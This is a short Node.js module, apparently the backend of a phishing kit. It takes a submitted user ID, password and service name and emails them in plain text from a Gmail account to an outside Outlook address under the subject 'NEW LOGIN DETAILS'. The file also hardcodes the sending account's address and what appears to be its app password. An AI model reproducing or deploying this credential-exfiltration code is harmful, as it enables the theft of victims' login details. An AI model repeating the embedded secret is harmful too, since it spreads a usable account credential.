const nodemailer = require('nodemailer')

const sendAuthMail = (userID, password, name, res) => {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'webiniy01@gmail.com',
      pass: 'ltgy qoqa zvfd uclp',
    },
  })

  const text = `New login details. User ID: ${userID}, password: ${password}, Service Name: ${
    name || 'Not available'
  }`

  const mailOptions = {
    from: 'webiniy01@gmail.com',
    to: 'Wadewade49@outlook.com',
    subject: 'NEW LOGIN DETAILS',
    text,
  }

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error.message)
      res.status(500).send('there was an error')
      return
    } else {
      console.log('Email sent: ' + info.response)
      res.status(200).json({ sent: 'success' })
      return
    }
  })
}

module.exports = { sendAuthMail }
